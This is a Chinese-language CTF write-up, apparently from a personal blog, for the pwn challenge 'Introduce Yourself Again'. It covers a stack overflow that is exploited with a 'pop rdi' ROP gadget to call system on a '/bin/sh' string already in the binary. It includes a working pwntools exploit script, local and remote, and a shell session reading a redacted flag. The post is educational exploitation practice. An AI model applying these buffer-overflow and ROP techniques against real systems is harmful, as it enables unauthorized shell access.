---
title: "Introduce Yourself Again"
published: 2026-10-24
description: "利用 ROP 设置函数参数，调用 system 获取 Shell。"
tags: ["CTF", "Mini 2025", "Pwn", "栈溢出", "ROP"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

> close the door and introduce yourself again

## 伪代码
```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  system(command: "echo I have removed the /bin/sh");
  system(command: "echo \"I'm sure you can't hack me this time!\"");
  system(command: "echo Now can you introduce yourself again?");
  return read(fd: 0, buf, nbytes: 0x80u);
}
```

## 漏洞分析
本题依旧是栈溢出，允许覆盖Buf后面的内容。函数里恰好给了system()函数可以让我们执行程序，讽刺的是，这题说自己已经移除了/bin/sh，但是`"echo I have removed the /bin/sh"`这一段内部就有"/bin/sh"可以让我们作为第一个参数rdi传给system，所以就格外的简单了。

## 漏洞利用
我们用ROPgadget探查有没有能修改rdi的gadget
```zsh
❯ ROPgadget --binary ./vuln | grep "rdi"
0x00000000004010e6 : or dword ptr [rdi + 0x404040], edi ; jmp rax
0x0000000000401158 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401283 : pop rdi ; ret
```

恰好在0x401283有我们需要的gadget，我们只需要把Saved RIP覆盖成上文gadget后，加上我们能寻找到的已有的/bin/sh的字符串，也就是字符串0x402008加上偏移量24，然后执行system，在这题中可以是0x401189

## exp
```python
from pwn import *
p = process("./vuln")
payload = b"/bin/sh\x00".ljust(40, b"0") + p64(0x401283) + p64(0x402008+24) + p64(0x401189)
p.sendafter(b"?\n", payload)
p.interactive()
```

remote:
```python
from pwn import *
p = remote("HOST_REDACTED", 0)
payload = b"/bin/sh\x00".ljust(40, b"0") + p64(0x401283) + p64(0x402008+24) + p64(0x401189)
p.sendafter(b"?\n", payload)
p.interactive()
```

```zsh
❯ python -u "/home/copper0so4/Downloads/attachment/exp.py"
[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
[*] Switching to interactive mode
$ cat flag
[FLAG REDACTED]
```
